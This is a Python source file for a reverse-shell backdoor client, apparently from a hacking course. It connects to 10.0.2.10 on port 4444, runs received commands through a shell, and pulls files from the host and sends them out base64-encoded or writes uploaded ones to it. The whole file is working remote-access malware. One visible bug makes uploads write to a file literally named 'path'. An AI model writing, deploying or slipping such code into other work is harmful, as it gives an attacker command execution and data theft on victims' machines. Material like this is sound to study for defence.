import socket
import subprocess
import simplejson
import os
import base64

class MySocket():
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_connection.connect((ip, port))

    def command_execution(self, command):
        return subprocess.check_output(command, shell=True, text=True)

    def json_send(self, data):
        if isinstance(data, bytes):
            data = base64.b64encode(data).decode()
        
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def execute_cd_command(self, directory):
        os.chdir(directory)
        return "Cd to " + directory

    def read_file_contents(self, path):
        with open(path, "rb") as my_file:
            return my_file.read()

    def save_file(self, path, content):
        with open("path", "wb") as my_file:
            my_file.write(base64.b64decode(content))   
            return "Download OK" 

    def start_connection(self):
        while True:
            json_command = self.json_receive()
            try:
                if json_command[0] == "quit":
                    self.my_connection.close()
                    exit()

                elif json_command[0] == "cd" and len(json_command) > 1:
                    command_output = self.execute_cd_command(json_command[1])

                elif json_command[0] == "download" and len(json_command) > 1:
                    command_output = self.read_file_contents(json_command[1])

                elif json_command[0] == "upload":
                    command_output = self.save_file(json_command[1], json_command[2])
                else:
                    command_output = self.command_execution(json_command)
            except Exception:
                command_output = "Error!"
            self.json_send(command_output)

        self.my_connection.close()

my_socket_object = MySocket("10.0.2.10", 4444)
my_socket_object.start_connection()